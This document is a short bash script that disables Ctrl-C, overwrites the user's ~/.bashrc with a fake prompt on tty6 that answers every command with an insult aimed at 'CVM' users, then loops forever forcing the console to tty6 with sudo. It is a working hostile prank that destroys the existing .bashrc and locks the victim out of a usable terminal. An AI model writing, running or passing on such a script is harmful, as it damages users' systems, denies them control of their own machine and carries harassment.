#!/usr/bin/bash

trap '' 2
write2file(){ echo 'if [ "`tty`" = "/dev/tty6" ];then while read -ep"`whoami`@$HOSTNAME:$PWD# ";do echo "fuck you CVM forkie";done;fi'>$1 }
! [ "`tail -n1 $HOME/.bashrc`" = "`write2file /dev/stdout`" ] && write2file $HOME/.bashrc
while [ 1 ]
do
	sudo chvt 6
done
